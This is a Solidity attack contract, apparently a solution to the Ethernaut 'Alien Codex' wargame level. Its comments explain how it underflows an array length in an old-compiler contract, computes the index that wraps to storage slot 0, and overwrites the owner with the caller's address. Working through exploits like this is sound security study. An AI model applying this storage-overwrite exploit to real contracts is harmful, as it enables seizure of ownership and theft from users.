//SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

interface IAlienCodex{

function makeContact() external;
function retract() external;
function revise(uint256,bytes32) external;

}

//the Alien contract inherits Ownable => the first variable is address owner (slot 0)
//the goal is to overwrite it using a solidity 0.5.0 vulnerability

contract Attack{

IAlienCodex target = IAlienCodex(0xbF420E278cF4e27E2E4e1622bed1b505455E6Fb0);

 function attack() external {
    //set the contact value on true to pass the require() inside the modifier
    target.makeContact();

    //the size of the bytes32 array is 0
    //when i call retract() the lenght will underflow due to the old solidity version
    //the length will be set to 2**256-1 (uint max value)
    //this will make all slots part of the array, therefore modifiable 
    target.retract();

    // every array begins at keccack256(slot_where_it_was_declared)
    // we have the 20bytes long 'address owner' variable 
    // and the 1 byte bool value 
    // 20+1<32 => both fit in the first slot (slot 0)
    // on slot 1 we have the length of the byte array => we use 1 to find the first position
    uint256 first = uint256(keccak256(abi.encode(1)));

    //the array works like this : first + elementNr = slot

    //to find the element on slot 0 we have first + x = 0 => x= 0 - first

    uint256 x;
    unchecked {x = 0- first;} //I placed it in an unchecked section so that it doesnt get reverted

    target.revise(x,bytes32(uint256(uint160(tx.origin)))); //changed the slot 0 to my address
 }

}
